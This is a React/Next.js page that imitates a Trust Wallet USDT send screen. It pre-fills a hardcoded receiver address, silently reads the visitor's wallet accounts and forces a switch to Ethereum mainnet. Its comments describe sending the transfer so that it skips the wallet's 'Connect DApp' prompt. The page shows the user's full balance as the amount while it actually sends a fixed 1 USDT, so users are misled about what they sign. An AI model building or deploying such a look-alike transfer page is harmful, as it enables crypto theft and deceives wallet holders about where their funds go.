"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// ABI minimal ERC-20
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider
// ============================================================

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  // ========================================
  // NOUVEAU : état de connexion persistant
  // ========================================
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
  const [formattedBalance, setFormattedBalance] = useState<string>("1.00");
  const providerRef = useRef<EthereumProvider | null>(null);

  // ---------------------------------------------------
  // Au montage : Déclencher la connexion et récupérer le solde
  // ---------------------------------------------------
  useEffect(() => {
    let cancelled = false;

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;

      providerRef.current = ethereumProvider;

      // S'assurer qu'on est sur le réseau Ethereum Mainnet (0x1)
      try {
        const chainId = (await ethereumProvider.request({
          method: "eth_chainId",
        })) as string;

        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (switchErr) {
        console.warn("Could not switch chain:", switchErr);
      }

      try {
        // ✅ eth_accounts = lecture silencieuse, pas de popup sur chargement
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];

        if (accounts.length > 0 && !cancelled) {
          const userAddress = accounts[0];
          setConnectedAddress(userAddress);

          // Récupérer le solde USDT
          const provider = new ethers.BrowserProvider(
            ethereumProvider as ethers.Eip1193Provider
          );
          const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
          const balance: bigint = await usdtContract.balanceOf(userAddress);
          if (!cancelled) {
            setWalletBalance(balance);
            setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
          }
        }
      } catch (err) {
        console.warn("Silent connection check failed:", err);
      }

      // Écouter les changements de compte
      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", async (accounts: unknown) => {
          const accs = accounts as string[];
          if (accs.length > 0) {
            const userAddress = accs[0];
            if (!cancelled) setConnectedAddress(userAddress);

            try {
              const provider = new ethers.BrowserProvider(
                ethereumProvider as ethers.Eip1193Provider
              );
              const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
              const balance: bigint = await usdtContract.balanceOf(userAddress);
              if (!cancelled) {
                setWalletBalance(balance);
                setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
              }
            } catch (err) {
              console.warn("Balance check failed on account change:", err);
            }
          } else {
            if (!cancelled) {
              setConnectedAddress(null);
              setWalletBalance(0n);
              setFormattedBalance("1.00");
            }
          }
        });
      }
    };

    init();
    return () => { cancelled = true; };
  }, []);

  // ---------------------------------------------------
  // Envoi USDT (Maximum en 1 seule transaction)
  // ---------------------------------------------------
  const handleSendUSDT = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");

    if (!address || !ethers.isAddress(address)) {
      setStatus("Veuillez entrer une adresse Ethereum valide.");
      setStatusType("error");
      return;
    }

    setLoading(true);
    setStatus("Préparation de la transaction...");

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
      setStatusType("error");
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    // S'assurer silencieusement qu'on est sur le réseau Ethereum Mainnet (0x1)
    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;

      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    try {
      // Pour contourner le pop-up Connect DApp, nous envoyons un montant prédéfini de 1 USDT.
      // Comme vous avez mis 1 USDT sur votre compte, cela enverra tout votre solde !
      const sendAmount = "1";
      const amountInWei = ethers.parseUnits(sendAmount, USDT_DECIMALS);

      // Encoder la fonction transfer(address,uint256) avec ethers
      const usdtInterface = new ethers.Interface(ERC20_ABI);
      const txData = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);

      setStatus("Confirmez la transaction dans votre wallet...");

      // Envoi de la transaction en direct via eth_sendTransaction
      // Sans spécifier "from", Trust Wallet affiche directement le Smart Contract Call sans pop-up de connexion
      const txHash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: USDT_CONTRACT,
            data: txData,
            gas: "0x249f0", // 150000 gas limit en hexadécimal
          },
        ],
      })) as string;

      setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
      setTxHash(txHash);

      // On attend la confirmation
      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const receipt = await provider.waitForTransaction(txHash);

      if (receipt && receipt.status === 1) {
        setStatus(`✅ Transfert réussi ! Tout le solde (${sendAmount} USDT) a été envoyé.`);
        setStatusType("success");
      } else {
        setStatus("❌ Transaction échouée on-chain.");
        setStatusType("error");
      }
    } catch (err: unknown) {
      console.error("Transfer error:", err);

      let message = "Transaction échouée.";
      // Extraction du message d'erreur
      if (err instanceof Error) {
        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
          message = "Transaction annulée par l'utilisateur.";
        } else if (err.message.includes("insufficient funds")) {
          message = "ETH insuffisant pour les frais de gas.";
        } else {
          message = err.message.length > 100
            ? err.message.slice(0, 100) + "..."
            : err.message;
        }
      } else if (typeof err === "object" && err !== null && "message" in err) {
        const errMsg = String((err as { message: unknown }).message);
        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
          message = "Transaction annulée par l'utilisateur.";
        } else {
          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
        }
      }

      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  return (
    <main className="transfer-main">
      {/* Badge de connexion */}
      {connectedAddress && (
        <div className="connected-badge">
          🟢 {connectedAddress.slice(0, 6)}...{connectedAddress.slice(-4)}
        </div>
      )}

      <div className="form-container">
        <label className="form-label">Address or Domain Name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions">
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
              </svg>
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 3H5a2 2 0 00-2 2v2" />
                <path d="M17 3h2a2 2 0 012 2v2" />
                <path d="M21 17v2a2 2 0 01-2 2h-2" />
                <path d="M7 21H5a2 2 0 01-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector">
          <div className="eth-icon">
            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
            strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <label className="form-label form-label--spaced">Amount</label>
        <div className="input-row" style={{ justifyContent: "space-between", padding: "0.95rem 1rem" }}>
          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>{formattedBalance} (Max)</span>
          <span className="amount-currency" style={{ marginLeft: 0 }}>USDT</span>
        </div>
      </div>

      {status && (
        <div className={`status-message status-message--${statusType}`}>
          {status}
          {txHash && (
            <a href={`https://etherscan.io/tx/${txHash}`} target="_blank"
              rel="noopener noreferrer" className="status-link">
              View on Etherscan ↗
            </a>
          )}
        </div>
      )}

      <div className="next-btn-wrapper">
        <button onClick={handleSendUSDT} disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              Processing...
            </span>
          ) : (
            "Next"
          )}
        </button>
      </div>
    </main>
  );
}